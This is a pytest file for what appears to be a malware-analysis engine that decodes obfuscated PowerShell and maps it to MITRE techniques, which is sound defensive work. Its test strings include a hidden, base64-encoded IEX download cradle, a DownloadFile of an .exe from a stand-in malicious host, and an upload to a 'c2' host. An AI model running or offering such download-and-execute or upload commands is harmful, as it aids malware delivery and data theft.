"""RC5 Phase 9.5c · Deep PowerShell decoding tests.

Covers the new WebClient method interception, GZipStream / DeflateStream
transparent decompression, the deep-decode guard (MAX_DECODE_DEPTH),
cycle detection, and the recursive -enc → SIR → Behavior pipeline that
GC-090 exercises end-to-end.
"""
from __future__ import annotations

import base64
import gzip
import zlib

import pytest

from engine.exec_graph import NodeKind
from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.powershell_interpreter import (
    PowerShellInterpreter,
    MAX_DECODE_DEPTH,
    _try_decompress,
)
from engine.detectors.behavior_extractor import extract_behaviors
from engine.detectors.mitre_mapper import map_behaviors_to_mitre
from engine.detectors.verdict_v2 import compute_verdict


def _run(src: str):
    return PowerShellInterpreter().interpret(PowerShellParser().parse(src))


# ── WebClient method interception ──────────────────────────────────────
def test_webclient_downloadstring_emits_http_node():
    src = '(New-Object Net.WebClient).DownloadString("http://x.y/a")'
    g = _run(src)
    http_nodes = [n for n in g.nodes if n.kind == NodeKind.http]
    assert http_nodes, "expected HttpNode from DownloadString"
    n = http_nodes[0]
    assert n.args.get("url") == "http://x.y/a"
    assert n.args.get("direction") == "download"


def test_webclient_downloadfile_emits_http_node():
    src = '$w = New-Object System.Net.WebClient; $w.DownloadFile("https://evil.tld/p.exe","C:\\a.exe")'
    g = _run(src)
    http_nodes = [n for n in g.nodes if n.kind == NodeKind.http]
    assert http_nodes
    assert http_nodes[0].args.get("url") == "https://evil.tld/p.exe"


def test_webclient_uploadstring_emits_http_upload():
    src = '(New-Object Net.WebClient).UploadString("http://c2/x", "data")'
    g = _run(src)
    http_nodes = [n for n in g.nodes if n.kind == NodeKind.http]
    assert http_nodes
    assert http_nodes[0].args.get("direction") == "upload"


def test_downloadstring_produces_t1105_mitre():
    src = '(New-Object Net.WebClient).DownloadString("http://x.y/a")'
    g = _run(src)
    b = extract_behaviors(g)
    m = map_behaviors_to_mitre(b)
    ids = {t.technique_id for t in m}
    assert "T1105" in ids, f"expected T1105 (Ingress Tool Transfer), got {ids}"


# ── Deep -enc pipeline ─────────────────────────────────────────────────
def test_enc_deep_decode_produces_malicious_verdict():
    inner = 'IEX (new-object net.webclient).DownloadString("http://x.y/a")'
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _run(f"powershell.exe -nop -w hidden -enc {b64}")
    b = extract_behaviors(g)
    m = map_behaviors_to_mitre(b)
    ids = {t.technique_id for t in m}
    assert {"T1059", "T1027", "T1105"}.issubset(ids), \
        f"expected T1059+T1027+T1105, got {ids}"
    v = compute_verdict(b, m, [])
    assert v.verdict.value in ("Malicious", "Critical"), \
        f"expected Malicious/Critical, got {v.verdict.value}"


def test_enc_short_flag_e_also_decoded():
    inner = '(New-Object Net.WebClient).DownloadString("http://d/x")'
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    g = _run(f"powershell -enc {b64}")
    http_nodes = [n for n in g.nodes if n.kind == NodeKind.http]
    assert http_nodes, "expected HttpNode from decoded -enc payload"


# ── Cycle detection ────────────────────────────────────────────────────
def test_enc_cycle_detection_terminates():
    # Craft a payload whose -enc body decodes back to itself under
    # UTF-16LE base64: we don't need a true fixed-point, just prove that
    # feeding the same string twice through IEX terminates.
    src = '$s = \'iex "$s"\'\niex $s'
    g = _run(src)
    # No infinite loop → interpret() returned. Also, at least one
    # unresolved node with cycle/depth reasoning should be present.
    unresolved = [n for n in g.nodes if n.kind == NodeKind.unresolved]
    reasons = " ".join((n.args.get("reason") or "") for n in unresolved).lower()
    assert any(k in reasons for k in ("cycle", "depth", "cap")), \
        f"expected safety-net termination, got reasons: {reasons}"


def test_max_decode_depth_constant_is_10():
    assert MAX_DECODE_DEPTH == 10


# ── FromBase64String + decompression ──────────────────────────────────
def test_gzip_helper_decompresses_gzip():
    plain = b"hello-gzip-payload"
    packed = gzip.compress(plain)
    assert _try_decompress(packed) == plain


def test_deflate_helper_decompresses_raw_deflate():
    plain = b"hello-deflate-payload"
    co = zlib.compressobj(-1, zlib.DEFLATED, -zlib.MAX_WBITS)
    packed = co.compress(plain) + co.flush()
    assert _try_decompress(packed) == plain


def test_zlib_helper_decompresses_zlib():
    plain = b"hello-zlib-payload"
    packed = zlib.compress(plain)
    assert _try_decompress(packed) == plain


def test_frombase64_gzip_getstring_produces_plaintext():
    """[Convert]::FromBase64String → gzip bytes → [Encoding]::UTF8.GetString
    should transparently decompress and yield plaintext for downstream IEX.
    """
    plain = 'Write-Host "decoded-and-inflated"'
    packed = gzip.compress(plain.encode("utf-8"))
    b64 = base64.b64encode(packed).decode()
    src = (
        f'$b = [System.Convert]::FromBase64String("{b64}"); '
        f'$s = [System.Text.Encoding]::UTF8.GetString($b); '
        f'iex $s'
    )
    g = _run(src)
    # A decompress marker should be present (var_expand with kind=decompress).
    marks = [n for n in g.nodes
             if n.kind == NodeKind.var_expand
             and (n.args or {}).get("kind") == "decompress"]
    assert marks, "expected a decompress marker node"


# ── Determinism (no AI, identical graph across runs) ──────────────────
def test_deep_decode_is_deterministic():
    src = (
        'powershell.exe -enc '
        + base64.b64encode(
            '(New-Object Net.WebClient).DownloadString("http://x.y/a")'
            .encode("utf-16le")
        ).decode()
    )
    g1 = _run(src)
    g2 = _run(src)
    # Same set of node kinds and same URL evidence
    urls_1 = sorted([n.args.get("url", "") for n in g1.nodes if n.kind == NodeKind.http])
    urls_2 = sorted([n.args.get("url", "") for n in g2.nodes if n.kind == NodeKind.http])
    assert urls_1 == urls_2 == ["http://x.y/a"]
